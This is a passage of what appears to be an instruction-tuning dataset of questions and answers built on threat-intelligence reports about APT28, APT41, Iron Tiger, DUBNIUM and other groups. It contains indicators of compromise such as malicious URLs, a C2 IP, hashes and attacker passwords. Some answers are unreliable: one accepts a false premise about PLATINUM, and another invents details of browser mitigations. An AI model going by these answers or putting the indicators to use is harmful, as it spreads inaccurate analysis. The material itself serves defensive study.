to \"coreshell.dll\" and making minor changes to the network communications, as seen in Figure 7.\nThe hostname, volume serial number and OS version data are encoded in the new URL format. As seen in the table below, the SOURFACE/ CORESHELL developers also made other modifications that changed the exported function name and file size over time.\nFigure 7: Example of modified SOURFACE vs. CORESHELL communications\nSOURFACE URL for a sample compiled April 2013: http://[hostname]/~book/cgi-bin/brvc.cgi?WINXPSP3c95b87a4-05_01\nCORESHELL URL for a sample compiled April 2013: http://[hostname]/~xh/ch.cgi?enhkZm1GNmY1YWg0eGcxMGQ1MDUwMQ==\nTable 4: Evolution of SOURFACE downloader over time\n17 SOURFACE with minor changes to network communications (see Figure 7).\n18 Basic anti-debug measures added (process listing, rand timing, is DebuggerPresent).\n19 Switches from loading a secondary DLL (netui.dll/WinIDS.dll) to uploading the contents of %temp%\\chkdbg.log.\n20 Statically links msvcrt library.\n21 Statically links msvcrt library and the strings used to identify the imported libraries and functions are reversed prior to being used, then reversed back after use.\n22This version added assembly level obfuscation, which slows down analysis. This variant requires the OS to be at least Windows Vista.\nMedium Headline: In April 2013, based on compile time, the group began to make significant alterations to the SOURFACE downloader.\nFigure 8: NATO-themed decoy delivered with possible EVILTOSS predecessor from 2004\nVariants of the SOURFACE second stage backdoor, EVILTOSS, share some code similarities with SOURFACE.  However, it contains more capabilities, including the ability to provide access to the file system and registry, enumerate network resources, create processes, log keystrokes, access stored credentials, and execute shellcode. The backdoor encrypts data that it uploads with an RSA public key. Many of its variants we have seen are named netui.dll. EVILTOSS variants may use the Simple Mail Transfer Protocol (SMTP) to send stolen data in an attachment named \"detaluri. dat\". The backdoor attaches this file to a preformatted email and sends it out through a victim's mail server.\nInterestingly, we found an antivirus report from 200423  detailing what appears to be an early variant of EVILTOSS. The backdoor was installed alongside the NATO-themed decoy document depicted in Figure 8. The backdoor sent data via SMTP to nato_smtp@mail[.]ru and received its tasking via POP from nato_pop@mail[.]ru. Although we have not conclusively attributed this sample to APT28, it does suggest the possibility that APT28 has been operating since as early as 2004.24\n23  http://ae.norton.com/security_response/print_writeup.jsp?docid=2004-081915-1004-99\n24 Although the malware family and interest in NATO make it likely that APT28 was involved, we cannot conclusively attribute this sample to APT28 based on these factors alone.  We have no evidence that they controlled the C2 for this malware or were using EVILTOSS in 2004. APT28 could have possibly obtained this source code from another group of actors.  Also, malware can be passed from group to group.  The other malware that we associate with APT28 in this paper is more strongly attributed to the group using additional factors, some of which we mention in Appendix A.\n\nWhat is the significance of the discovery of an early variant of EVILTOSS from 2004, and how does it relate to APT28's potential operational history?",
    "output": "A: The discovery of an early variant of EVILTOSS from 2004 is significant because it suggests the possibility that APT28 has been operating since as early as 2004. This variant was installed alongside a NATO-themed decoy document and used SMTP to send data to a specific email address. While conclusive attribution to APT28 is not certain, the malware family and interest in NATO align with APT28's known activities, indicating a potentially longer operational history than previously documented.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the network segmentation strategy implemented by Oracle's Hospitality Division potentially facilitate unauthorized access by the Russian Cybercrime group?",
    "output": "According to a confidential source within Oracle's Hospitality Division, the breach initially occurred in one of Oracle's major point-of-sale data centers in Manassas, VA. Initially, the customer's network and the internal Oracle network were on the same network. The networking team performed a network segmentation of these two networks for security purposes. However, ironically, this segmentation seems to have allowed access from the Russian Cybercrime group, suggesting that the implementation of the segmentation strategy may have inadvertently created vulnerabilities that were exploited by the attackers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Abstract\nTargeted attacks on civil society and non-governmental organizations have gone underreported despite the fact that these organizations have been shown to be frequent targets of these attacks. In this paper, we shed light on targeted malware attacks faced by these organizations by studying malicious e-mails received by 10 civil society organizations (the majority of which are from groups related to China and Tibet issues) over a period of 4 years.\nOur study highlights important properties of malware threats faced by these organizations with implications on how these organizations defend themselves and how we quantify these threats. We find that the technical sophistication of malware we observe is fairly low, with more effort placed on socially engineering the e-mail content. Based on this observation, we develop the Targeted Threat Index (TTI), a metric which incorporates both social engineering and technical sophistication when assessing the risk of malware threats. We demonstrate that this metric is more effective than simple technical sophistication for identifying malware threats with the highest potential to successfully compromise victims. We also discuss how education efforts focused on changing user behaviour can help prevent compromise. For two of the three Tibetan groups in our study simple steps such as avoiding the use of email attachments could cut document-based malware threats delivered through e-mail that we observed by up to 95%.\nMedium Headline: 2.1 Targeted Malware Overview\nTargeted malware are a category of attacks that are distinct from common spam, phishing, and financially motivated malware. Spam and mass phishing attacks are indiscriminate in the selection of targets and are directed to the largest number of users possible. Similarly, finan-cially motivated malware such as banking trojans seek to compromise as many users as possible to maximize the potential profits that can be made. The social engineering tactics and themes used by these kinds of attacks are generic and the attack vectors are sent in high volumes. By contrast targeted malware attacks are designed for specific targets, sent in lower volumes, and are motivated by the objective of stealing specific sensitive data from a target.\nTargeted malware attacks typically involve the following stages [24,66]:\nReconnaissance: During this stage attackers conduct research on targets including profiling systems, software, and information security defenses used to identify possible vulnerabilities and contextual information on personnel and activities to aid social engineering.\nDelivery: During this stage a vector for delivering the attack is selected. Common vectors include e-mails with malicious documents or links, or contacting targets through instant messaging services and using social engineering to send malware to them. Typically, a target of such an attack receives an e-mail, possibly appearing to be from someone they know, containing text that urges the user to open an attached document (or visit a website).\nCompromise: During this stage malicious code is executed on a target machine typically after a user initiated action such as opening a malicious document or link.\nCommand and Control: During this stage the infected host system establishes a communications channel to a command and control (C&C) server operated by the attackers. Once this channel has been established the attackers can issue commands and download further malware on to the system\nAdditional attacker actions: After a successful compromise is established, attackers can conduct a number of actions including ex-filtrating data from the infected host and transmitting it back to attackers through a process of encrypting, compressing, and transferring to a server\noperated by the attackers. Attackers may also use peripherals such as webcams and microphones to monitor users in real time. The infected host may also serve as a starting point to infect other machines on the network and seek out specific information or credentials.\nMedium Headline: 2.2 Targeted Malware and CSOs\nTargeted malware has become recognized by governments and businesses around the world as a serious political and corporate espionage threat. The United States government has been particularly vocal on the threat targeted malware enabled espionage poses. General Keith Alexander, current Director of the National Security Agency and Commander of United States Cyber Command has stated that the theft of US intellectual property through cyber espionage constitutes the \"greatest transfer of wealth in history\" [47]. Recent widely publicized targeted malware intrusions against Google, RSA, the New York Times and other high profile targets have raised public awareness around these attacks [20,44,48]\nDespite this increased attention, targeted malware is not a new problem, with over a decade of public reports on these kinds of attacks [66]. However, the majority of research on targeted malware is conducted by private security companies who typically focus on campaigns against industry and government entities. As a result, targeted attacks on civil society and non-governmental organizations have gone underreported despite the fact that these organizations have been shown to be frequently targeted by cyber espionage campaigns. In particular, communities related to ethnic minority groups in China including Tibetans, Uyghurs, and religious groups such as Falun Gong have been frequent targets of cyber espionage campaigns with reports dating back to at least 2002 [61].\nIn some cases, the same actors have been revealed to be targeting civil society groups, government and industry entities. A notable example of this was the 2009 report by the Citizen Lab, a research group at the University of Toronto, which uncovered the \"GhostNet\" cyber espionage network. GhostNet successfully compromised prominent organizations in the Tibetan community in addition to 1,295 hosts in 103 countries, including ministries of foreign affairs, embassies, international organizations, and news media [25]. The GhostNet case is not an isolated example, as other reports have shown CSOs (commonly Tibetan organizations) included as targets in campaigns that are also directed to a range of government and industry entities [8,26,28,29,54\u201356] Some of these reports include technical details on the CSO spe-cific attacks [26, 28,54, 55] while others note them as a target but do not address in detail [8,29,56].\nWhile the majority of documented targeted malware\ncampaigns against CSOs involve China and Tibet-related groups and potentially China-related attack operators [9\u201311, 23, 25, 26, 32, 61\u201365, 67, 68] , these kinds of attacks go beyond China. Recent research and news media have reported attacks against large human rights groups focused on multiple issues and countries [31, 46], and communities related to Syria [18] and Iran [37]. Researchers have also uncovered the use of commercial network intrusion products used to target activists from Bahrain [38], the United Arab Emirates [36], and journalists from Ethiopia [35].\nMedium Headline: 3.1 Study Participants\nWe recruited participants via three main channels: (1) an open call on our Web site, (2) outreach to organizations we had prior relationship with and (3) referrals from participating groups. As part of the study these groups agreed to share technical data (e.g., e-mails with suspicious attachments) and participate in interviews at the onset and end of the study. Their identity and any PII shared with us were kept strictly confidential.\nFor the purposes of our study, we focused on organizations with missions concerning the promotion or protection of human rights. For purposes of this study, \"human rights\" means any or all of the rights enumerated under the Universal Declaration of Human Rights [60], the International Covenant on Civil and Political Rights [58], and the International Covenant on Economic, Social and Cultural Rights [59]. We also considered organizations on a case by case basis that have a mission that does not directly implicate human rights, but who may nonetheless be targeted by politically motivated digital attacks because of work related to human rights issues (e.g., media organizations that report on human rights violations).\nIn total, 10 organizations participated in the study (summarized in Table 1). The majority of these groups work on China-related rights issues and five of these organizations focus specifically on Tibetan rights. The high rate of participation from China and Tibet-related human rights issues is due in part to our previous relationships with these communities and a significant interest and enthusiasm expressed by the groups. In addition to the China and Tibet-related groups, our study also includes\ntwo groups, Rights Group 1 and 2 that work on multiple human rights related issues in various countries.\nThe majority of organizations operate from small of-fices with less than 20 employees. Some organizations (China Group 2, Tibet Group 2) have no physical office and consist of small virtual teams collaborating remotely, often from home offices. Of these groups only two (China Group 1, China Group 3) have a dedicated system administrator on staff. Other groups (Tibet Groups 1-5; China Group 2) rely on volunteers or staff with related technical skills (e.g. Web development) to provide technical support. Rights Group 1 and Rights Group 2 are much larger organizations relative to the others in our sample. Both organizations have over 100 employees, multiple offices, dedicated IT teams, and enterprise level computing infrastructures.\nQuestion: What role does social engineering play in targeted malware attacks against CSOs? How can understanding this aspect help in designing effective defense strategies?",
    "output": "Answer: Social engineering plays a crucial role in targeted malware attacks against CSOs, as attackers place significant effort into crafting convincing and personalized email content to mislead users. Understanding this aspect is vital for designing effective defense strategies. By recognizing that the technical sophistication of malware is often low, CSOs can focus on education efforts aimed at changing user behaviors. Teaching users to identify suspicious emails, avoid opening attachments, and use tools to check links for malware can significantly reduce the risk of compromise. This approach is more cost-effective and practical for CSOs with limited resources.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Reverse-engineering DUBNIUM's Flash-targeting exploit\nJune 20, 2016\nThe DUBNIUM campaign in December involved one exploit in-the-wild that affected Adobe Flash Player. In this blog, we're going to examine the technical details of the exploit that targeted vulnerability (<http://www.cvedetails.com/cve/CVE-2015-8651/>)CVE-2015-8651. For more details on this vulnerability, see (<https://helpx.adobe.com/security/products/flash-player/apsb16-01.html>)Adobe Security Bulletin APSB16-01 .\nNote that Microsoft Edge on Windows 10 was protected from this attack due to the mitigations introduced into the browser.\n\nBased on the above text, answer a question. How did the DUBNIUM campaign leverage the CVE-2015-8651 vulnerability in Adobe Flash Player, and what specific mitigations in Microsoft Edge on Windows 10 prevented this attack?",
    "output": "The DUBNIUM campaign in December utilized an exploit targeting the CVE-2015-8651 vulnerability in Adobe Flash Player. This vulnerability allowed the attackers to execute arbitrary code on the victim's machine. However, Microsoft Edge on Windows 10 was protected from this attack due to the specific mitigations introduced into the browser. These mitigations likely included enhanced sandboxing, memory protection mechanisms, and other security features designed to prevent the execution of malicious code.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Why have there been limited high-profile, coercive, and damaging cyber attacks in the Russo-Ukrainian conflict compared to previous conflicts like those in Estonia and Georgia?",
    "output": "The Russo-Ukrainian conflict has seen limited high-profile, coercive, and damaging cyber attacks compared to previous conflicts like those in Estonia and Georgia. Instead, the publicly reported examples of Computer Network Attacks (CNA) in Ukraine mostly include Denial of Service (DoS) and Distributed Denial of Service (DDoS) attacks aimed at undermining telecommunications infrastructure. This approach may be due to Moscow wanting to avoid international criticism similar to that received after its alleged cyber operations in Georgia in 2008 and Estonia in 2007. Instead, Moscow seems to be using more narrowly focused, limited operations in support of strategic state objectives, primarily via sustained cyber espionage rather than widespread attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Directory of f:\\2_Program\\Orbis_zmail\\Debug\nIn addition, the computer that satisfies the condition decrypts the encrypted code inside with XOR 0x55 key, and generates it as 'conhost.exe' filename and executes it.\nFor instance, the 'conhost.exe' file communicates with AOL Messenger.\n[Figure 19] The code to communicate with AOL Messenger\nIt is noteworthy that the password code (dPQms&Thvldk1987), which is used to log in to AOL Messenger, will be converted to '\uc608\uc05c&\uc3d8\ud53c\uc5441987 (Pretty&Sopia1987)' in Korean when typing it with Hangul keyboard.\nAttackers also use multiple Chinese expressions in AOL messenger communication. Another variant uses the 'Dajiahao' code as the mutex key, which means 'Hello everyone' in Chinese. dPfWls&Rkapfns19 is used as the password for the AOL login account and it is changed to '\uc610\ucc10&\uae4c\uba54\ub8ec19 (Yelchin&Kermelon19)' in Korean when typing with Korean keyboard.\nMany variants are found in various forms. In case of 'SEIKO' computer name, the following PDB path is observed and emails like 'zum36085@zmail.ru', 'pghlsn333@gmail.com' were used.\n- F:\\2_Program\\Orbis_zmail\\Release\\RecvTest_zmail.pdb\nThe following PDB paths are identified in similar variants:\n- F:\\2_Program\\Orbis_academia\\Release\\RecvTest_zmail.pdb\n- F:\\2_Program\\Orbis_academia\\Release\\Recv_Pwd_2_India.pdb\n[Figure 21] PDB code with Zmail test information\nESRC has been able to detect the attack technique aimed at an unspecified number of people in addition to the APT target attacks. The attackers infect users by injecting the malware in illegal software by subscribing to the Korean torrent website. Namely, they distribute the famous commercial software illegally after inserting malware inside.\nAttackers have earned points as follows from the Korean torrent site, and they actively uploaded files and posted comments as well.\n\u25a0 Time Series Analysis of Geumseong12 Group\nThe attackers hacked the Korean website and used it as C2 server for a while after using the AOL Messenger communication technique in the first half of 2013. However, they may have discovered that the technique is lack of continuous availability after the websites are detected and quickly shut down by the security providers and managers.\nAfter a while, they created a variant with excellent sustainability, exploiting the AOL Messenger communication technique. After that, the infected WordPress-based websites were mainly used it as a watering hole attack base.\nThey mainly used Flash player vulnerability files and 'Streamnation' cloud account, which is a personal media hub service, in attacks using the WordPress websites. The attackers continued to use the AOL messenger for the attacks, but they chose WordPress websites as a C2 server for mediation server of spear phishing and watering hole attacks.\nIn the meantime, as the \"Streamnation\" service is closed in February 2016, the attackers launched the testing for 'zmail.ru' service since the end of January 2016, which they had been continuously used before.\nAs such, the attackers attempted to change to the new C2 server system by introducing the 'zmail.ru' service and start to introduce 'pCloud' service with the AOL messenger communication. When creating a cloud service account, they use free email services not only in Korea but also in countries such as the US, China, India, and Russia.\nAs attack tactics have changed over time, CVE-2018-4878 vulnerability files have been sent to specific targets that had not been added to friends via KakaoTalk messages, and Android malicious apps targeting smartphone users have also been found.\nThe DOC document vulnerability attack on cryptocurrency was first reported overseas at the end of 2017. In addition, the attackers are steadily upgrading attack technologies such as distribution of malware disguising as security programs in Korea and China or infecting users via Torrent.\n[Changes in C2 techniques according to Time Series]\nMarch 26, 2013: AOL messenger service\nApril 20, 2013: Communication with a specific website in Korea\nJuly 10, 2015: WordPress Website Communication\nJuly 14, 2015: Streamnation Personal Cloud Service\nAugust 09, 2015: Streamnation Personal Cloud Service\nFebruary 09, 2016: Official end of Streamnation Personal Cloud Service\nApril 11, 2016: Pcloud Personal Cloud Service\nDecember 15, 2017: Official end of AOL Messenger service\nDecember 12, 2017: PubNub IaaS Service\nJanuary 16, 2018: PubNub laaS Service\nFebruary 23, 2018: PubNub IaaS Service\nAugust 14, 2018: PubNub IaaS Service\nMedium Headline: Conclusion\n- Persistent Threat\nSpecial Report\nConclusion\n\u25a0 Persistent Threat\nIn addition to the previous cases, similar infringement using the same IoC code or metadata has been discovered for many years in Korea, and ESRC is constantly pursuing the change process.\nFurther details will be available on 'Threat Inside', which is the service scheduled to be launched from the second half of the year. IoCs and the specialized intelligence report are provided to corporate customers via 'Threat Inside'.\nSpecial Report\nIndicator of Compromise (IoC)\n\u25a0 Press Resources\nFake AV Investigation Unearths KevDroid, New Android Malware https://blog.talosintelligence.com/2018/04/fake-av-investigation-unearths-kevdroid.html\nReaper Group's Updated Mobile Arsenal\nhttps://researchcenter.paloaltonetworks.com/2018/04/unit42-reaper-groups-updated-mobile-arsenal/\n\u6700\u65b0rtf\u6f0f\u6d1e\u91ce\u5916\u5229\u7528\u5206\u6790\u62a5\u544a\nhttps://s.tencent.com/research/report/274.html\n\uad11\ubcf5\uc808 \uc55e\ub454 14 \uc77c, \u5317 \ucd94\uc815 \ubcf4\uc548 \ud504\ub85c\uadf8\ub7a8 \uc704\uc7a5 \uacf5\uaca9 \ud3ec\ucc29\nhttps://www.boannews.com/media/view.asp?idx=72235\n\u25a0 File name\n\uc548\uc804\uc218\uce59.zip\n\uc548\uc804\uc218\uce59.hwp\ndenk.zip\n360TS_Setup_Mini.exe\nbitcoin-trans.doc\n1.apk\nconhost.exe\n\u25a0 Malware MD5\naf6721145079a05da53c8d0f3656c65c 1213e5a0be1fbd9a7103ab08fe8ea5cb edc1bdb2d70e36891826fdd58682b6c4 b710e5a4ca00a52f6297a3cc7190393a 05eef00de73498167b2d7ebdc492c429 ff32383f207b6cdd8ab6cbcba26b1430 84cbbb8cdad90fba8b964297dd5c648a ab2a4537c9d6761b36ae8935d1e5ed8a fa39b3b422dc4232ef24e3f27fa8d69e\n8ab2819e42a1556ba81be914d6c3021f 24fe3fb56a61aad6d28ccc58f283017c 9525c314ecbee7818ba9a819edb4a885 fa39b3b422dc4232ef24e3f27fa8d69e\n\u25a0 Domain\nhttp://endlesspaws.com/vog/tan[.]php?fuck=x\nhttp://endlesspaws.com/vog/denk[.]zip seline.co.kr/datafiles/CNOOC[.]php www.causwc.or.kr/board_community01/board_community01/index2[.]php www.kumdo.org/admin/noti/files/iindex[.]php www.icare.or.kr/upload/board/index1[.]php cnjob.co.kr/data/blog/iindex[.]php notac.co.kr/admin/case/iindex[.]php http://ebsmpi.com/ipin/360/down[.]php http://cgalim.com/admin/hr/hr[.]doc\n\u25a0 IP address\n175.45.178.133\n\u25a0 Mutex name\ntaihaole9366\n\u25a0 CVE\nCVE-2017-8759\nCVE-2015-5119\nCVE-2014-8439\nCVE-2015-0313\nCVE-2015-3090\nCVE-2015-3105\nCVE-2015-5119\n\u25a0 String\nHaizi\nLiuJin\nsrvrlyscss\n\ud504\ub85c\uc384\uc2a4\n\ud504\ub85c\uadf8\ub78c\nfastcameron13\npowercooper00\ndPfWls&Rkapfns19 (\uc610\ucc10&\uae4c\uba54\ub8ec 19)\ndPQms&Thvldk1987 (\uc608\uc05c&\uc3d8\ud53c\uc544 1987)\n\ud64d\ucc44\uc5f0[\ud558\uc728]\nKIM[Administrator]\nJAMIE[Jamie Kim]\nDONGMIN[MinSk]\nT-PC[T]\nYONGJA-PC\nUSER\nsec\nCRACKER-PC\nSEIKO\n# The content of the report or any part of it shall not be cited, reproduced, copied, stored or transmitted to third parties without a prior written consent of ESTsecurity.\nESTsecurity Response Center\n\nHow does the Geumseong121 group utilize the XOR encryption method in their attack strategy, and what is the significance of the 'conhost.exe' file in this context?",
    "output": "The Geumseong121 group employs XOR encryption with a key of 0x55 to decrypt and generate a file named 'conhost.exe' on computers that meet certain conditions. This file is significant because it communicates with AOL Messenger, indicating its role in command and control (C2) operations. The use of XOR encryption is notable for its simplicity and effectiveness in obfuscating the malicious code until it is executed.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Have MIR Customers had Access to these IOCs Before?\nThese IOCs are new! However, much of the detection capability in this set of indicators has already been available to our MIR customers. The IOCs may look different though as a result of improvements in creation and testing. Mandiant started 2013 with a focus on taking better advantage of our threat intelligence. We plan to continue to improve the synthesis of our threat intelligence and our IOCs by improving our breadth, IOC creation process, IOC management process, and IOC testing. The majority of these indicators, or modified versions of them, will be integrated into the next IOC release.\nSmall Headline: What Is the FAMILY Designator in This Set of IOCs?\nWe are using a new IOC designator in these IOCs called \"(FAMILY).\" Mandiant's Threat Intelligence Unit tracks malware by common features seen in groups of binaries. We call those groupings of binaries \"families.\" The IOCs included in this appendix are representatives of families of malware used by APT1. The new designator follows the family name in the \"Name\" field of the IOC, and the presence of (FAMILY) implies that that IOC applies to the whole family, not just one sample.\nSmall Headline: Why Do These IOCs Look Somewhat Different Than Other IOCs I Have Seen From Mandiant?\nIn many cases we have combined information that previously would have been in several indicators into a single indicator. Additionally, we have removed certain types of intelligence, since they are being released in separate appendices (such as FQDNs and IPs).\nAdditionally, some IOCs in this set are using file permutation blocks to catch variants of malware that might not be detected otherwise.\n\nWhy does Mandiant use the '(FAMILY)' designator in their Indicators of Compromise (IOCs) related to APT1, and how does this enhance the effectiveness of these IOCs?",
    "output": "A: Mandiant uses the '(FAMILY)' designator in their IOCs to indicate that the IOC applies to an entire family of malware, rather than just a single sample. This approach is based on tracking malware by common features seen in groups of binaries, which Mandiant's Threat Intelligence Unit refers to as 'families.' By using this designator, Mandiant can provide more comprehensive detection capabilities, as the IOCs included in this set represent families of malware used by APT1. This means that even if a specific variant of the malware is encountered, the IOCs are designed to detect it, enhancing the overall effectiveness of the threat detection process.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "PLATINUM\nTargeted attacks in South and Southeast Asia\nWindows Defender Advanced Threat Hunting Team\nThis document is for informational purposes only. MICROSOFT MAKES NO WARRANTIES, EXPRESS, IMPLIED, OR STATUTORY, AS TO THE INFORMATION IN THIS DOCUMENT.\nThis document is provided \"as-is.\" Information and views expressed in this document, including URL and other Internet website references, may change without notice. You bear the risk of using it.\nCopyright \u00a9 2016 Microsoft Corporation. All rights reserved.\nThe names of actual companies and products mentioned herein may be the trademarks of their respective owners.\n\nQ: How does the PLATINUM APT group leverage Windows Defender Advanced Threat Hunting capabilities to enhance its attack strategies? Provide a detailed explanation of the methodologies and technologies involved.",
    "output": "A: The PLATINUM APT group utilizes sophisticated methodologies and technologies to carry out targeted attacks in South and Southeast Asia. These attacks are analyzed by the Windows Defender Advanced Threat Hunting Team, which provides insights into the group's tactics, techniques, and procedures (TTPs). By leveraging advanced threat hunting capabilities, the team can identify and track the activities of the PLATINUM group, allowing for a deeper understanding of their attack strategies. This includes analyzing malicious artifacts, network traffic, and system behaviors to detect and respond to threats effectively. The team's work helps in improving the overall security posture by providing actionable intelligence and recommendations to mitigate similar attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Targeting\nWe identified one gambling company in the Philippines as compromised by this campaign. Interestingly, the threat actor registered a domain name similar to the company name and used it as a C&C. This was not surprising as we have noticed this threat actor targeting this industry since 2019 during our (<https://documents.trendmicro.com/assets/white_papers/wp-uncovering-DRBcontrol.pdf>)Operation DRBControl investigation, and  in 2021 with an update of SysUpdate. We also attempted to notify the company of this incident through all their listed channels but have received no feedback.\nAs stated in the \"Infection Vector\" section, we noticed the Youdu chat application was probably used as a lure. It is worth mentioning that the customers mentioned in the Youdu official website are all located inside China, which could be an indicator of the threat actor's interest in targets related to this country.\nConclusion\nThis investigation confirms that Iron Tiger regularly updates its tools to add new features and probably to ease their portability to other platforms, verifying the interest we found from this threat actor for Linux or Mac OS. It also corroborates this threat actor's interest in the gambling industry and the South East Asia region, as we previously noted in  and .\nThis campaign also substantiates the regular usage of chat applications as infection vectors from Iron Tiger. We expect to find further updates of these tools in the future to accommodate other platforms and apps.\nAs an additional warning, we want to highlight that the targeting can be wider than the samples and targeting we have already observed. In 2022, we  a campaign targeting Taiwan and the Philippines that made use of HyperBro samples (detected by Trend Micro as Backdoor.Win32.HYPERBRO.ENC) signed with a stolen Cheetah certificate. The BfV, a German governmental entity, published a (<https://www.verfassungsschutz.de/SharedDocs/publikationen/DE/cyberabwehr/2022-01-bfv-cyber-brief.pdf?__blob=publicationFile&v=10>)report in January 2022 mentioning attacks against German companies with HyperBro samples that were also signed with the same certificate. In October 2022, Intrinsec (<https://www.intrinsec.com/apt27-analysis/>)reported an incident in a French company also using HyperBro samples matching the structure we described in our 2021 (<https://www.trendmicro.com/en_no/research/21/d/iron-tiger-apt-updates-toolkit-with-evolved-sysupdate-malware-va.html>)investigation. This shows the threat actor is likely to reuse the tools mentioned here in future campaigns that might target different regions or industries in the short and long term. Considering the active campaign and regular developments made on this malware family, organizations are advised to enhance and broaden their current and established security measures, and heighten overall vigilance for possible infection vectors that can be abused by this threat group.\nIndicators of Compromise (IOCs)\nDownload the full list of indicators .\nQuestion: How does Iron Tiger leverage domain name registration and C&C infrastructure setup to target specific industries, and what implications does this have for organizations in those sectors?",
    "output": "Answer: Iron Tiger registers domain names similar to the names of targeted companies and uses them as Command and Control (C&C) servers. This tactic was observed in the case of a gambling company in the Philippines, which aligns with the group's historical interest in the gambling industry and the Southeast Asia region. This approach makes it easier for the threat actor to blend in with legitimate traffic and evade detection. Organizations need to be vigilant about domain registrations that mimic their own and monitor for unusual network activity to detect such targeted attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: APT41 Operational Times UTC +8\nThe group has also targeted cryptocurrencies, including at least one case in which there was a connection between cryptocurrency and an online video gaming platform.\n\u2022 In June 2018, APT41 sent spear-phishing emails using an invitation lure to join a decentralized gaming platform linked to a cryptocurrency service (Figure 5) that had positioned itself as a medium of exchange for online games and gambling sites. The malicious emails were sent from an email address listed with the name Tom\nGiardino, which is likely a reference to an employee at Valve, an American video game developer responsible for the software distribution platform Steam and various video games. The body of the email (Figure 6) also mentions gaming offerings. This provides another connection between the targeting of the cryptocurrency organizations and video game targeting.\n\u2022 In October 2018, the group compiled an instance of XMRig, a Monero cryptocurrency mining tool, demonstrating a continued interest in cryptocurrency.\nScreenshot of invitation to join the FairWin online gaming platform.\nEnglish translation of invitation to join the FairWin online gaming platform.\nFrom: Tom Giardino < >\nDate: <redacted>\nSubject: Project (FairWin) online application!\nProject Introduction:\nFairWin is a decentralized online gaming platform.\nBe sure to win fairness because our special FairChannel guarantees accurate RTP rates. The system is based on a blockchain, which means that the gameplay process is open. The payment of the bonus is automatic. Not dependent on the organizer. In addition to this, we also offer fun generous games with fascinating graphics. It can be run on any device and any browser so that all players can enjoy these experiences. Please refer to the attachment for other details!\nCASE STUDY\nVideo Game Industry Targeting\nAPT41 continuously returns to targeting the video game sector and seems to have matured its campaigns through lessons learned in operations against the industry. We believe these operations include broadly malicious activity that can enable further operations, such as targeting game source code and compromising digital certificates, while other activities are explicitly financially motivated, such as abusing in-game currency mechanics. APT41 campaigns focused on the video game sector have largely affected studios and distributors in East and Southeast Asia, although global companies based in the United States have also been targeted.\nThe group leverages many TTPs during the targeting of video game-related organizations, which are likewise employed in their espionage operations.\n\u2022 Since at least 2012, APT41 has repeatedly gained access to game development environments within affected companies, including online multiplayer networks, as well as targeting of production database administrators.\n\u2013 The group is competent in both Linux and Windows environments and can pivot easily between both environments within a single operation, including compromising intermediary servers that provide access to separated Windows and Linux environments.\n\u2013 In October 2012, APT41 used captured credentials to compromise a jump server and access a production environment where they deployed a Linux version of PHOTO. Based on the machines targeted, we have some indication that APT41 specifically sought to access production machines used in the development of an upcoming online game.\n\u2013 In 2014, APT41 used a variant of SOGU that is capable of connecting to Windows and Linux systems via SSH and Samba/CIFS.\n\u2013 APT41 has been observed inserting malicious code into legitimate video game files to distribute malware. In 2018, the group inserted CRACKSHOT malware into game files that were signed with legitimate code-signing certificates, most likely indicating access to the production environment, which facilitated a supply chain compromise.\n\u25aa A highly similar incident in 2014 suggests that APT41 (or a closely affiliated actor) has a history of carrying out such operations against the video game industry.\n\u2013 APT41's experience gaining access to production environments may have been a precursor to more recent supply chain compromises. The insertion of malware into a build environment for later distribution with legitimate software is a natural extension of the group's earliest activities. Additional details are provided in the section \"History of Supply Chain Compromises.\"\n\u2022 We have also observed APT41 limitedly deploy rootkits on Linux systems and Master Boot Record (MBR) bootkits, such as ROCKBOOT, on Windows systems to hide their malware and maintain persistence on victim systems. Selective deployment of ROCKBOOT suggests that APT41 reserves more advanced TTPs and malware only for high-value targets.\n\u2013 Bootkits are a stealthy means of installing malware because the code resides outside of the OS. Because bootkits are initialized prior to the OS and operate in kernel mode, OS applications and security tools may have great difficulty detecting bootkits.\n\u2013 The use of bootkits among threat actors, however, is rare. It is more common for threat actors to rely on techniques such as DLL search order hijacking or modifying Windows registry keys to achieve persistence.\n\u2013 The group used the Adore-NG rootkit on older Linux operating systems to hide their Linux backdoor ADORE.XSEC. Note that the Adore-ng rootkit is no longer in development and would likely not run successfully on modern Linux systems, but APT41 deployed this on a legacy game server.\nAPT41 is well-known for leveraging compromised digital certificates from video game studios to sign malware. The group has abused at least 19 different certificates in this way. Additional details on code-signing certificates are provided in the section \"Use of Code Signing Certificates.\"\n\u2022 In 2012, APT41 used a code-signing certificate from Mgame, a South Korean game publisher, against other gaming industry entities. The serial number for this certificate was:\n01:00:00:00:00:01:30:73:85:f7:02\n\u2022 A different Mgame digital certificate has been used by several other Chinese operators, including APT17, APT20, and APT31. It is unclear if this certificate was compromised at the same time as the one used by APT41 (or if it was stolen by APT41 and shared with these other groups). The serial number for this certificate was:\n4e:eb:08:05:55:f1:ab:f7:09:bb:a9:ca:e3:2f:13:cd\nAPT41 has blatantly engaged in financially motivated activity targeting the video game industry, including manipulating virtual currencies. These activities demonstrate established connections to underground marketplaces and familiarity with monetization and laundering techniques.\n\u2022 Using its access to a game production environment, in less than three hours the group generated tens of millions of dollars of a popular game's virtual currency. The money was credited to more than 1,000 accounts and most likely sold and laundered in underground markets.\n\u2022 APT41 has targeted payment services specializing in handling in-game transactions and real money transfer (RMT) purchases.\n\u2022 In a highly unusual case, APT41 attempted to extort a game company by deploying the Encryptor RaaS\nransomware. We suggest that APT41 sought to target in-game currency but found they could not monetize the specific targeted game, so the group resorted to ransomware to attempt to salvage their efforts and profit from the compromise.\n\u2013 This ransomware was sold via a Ransomware-as-a-Service (RaaS) operation that was available via a Tor (.onion) website. Users of the ransomware were charged a 20 percent fee for any collected ransom.\n\u2013 Since this was not the group's typical method of choice for collecting money from a victim environment, it is possible that APT41 turned to a pay-for-service ransomware to avoid 